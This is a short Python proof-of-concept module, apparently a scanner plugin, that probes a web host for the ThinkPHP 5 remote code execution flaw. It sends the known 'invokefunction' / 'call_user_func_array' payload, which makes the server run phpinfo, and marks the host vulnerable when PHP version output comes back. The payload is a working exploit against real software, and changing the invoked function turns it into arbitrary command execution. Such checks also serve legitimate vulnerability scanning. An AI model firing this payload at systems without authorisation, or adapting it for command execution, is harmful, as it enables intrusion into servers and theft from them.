import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def poc(url):
    poc_type = 'cms:thinkphp5_rce'

    payload = r'index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'

    ports = ['80']
 
    port_info = {} 

    port_info,ports = port_monitor(url, poc_type, ports)


    for port in ports:
        try:
            s = requests.get('http://'+url+payload)
            if (s.status_code == 200 and 'PHP Version' in s.text) or 'boolean' in s.text:
                port_info[port] = [1,poc_type,'Check it']
            else:
                port_info[port] = [0,poc_type,'Not work']
        except Exception as e:
            print(e)
            port_info[port] = [0,poc_type,'Conect failed']

    return port_info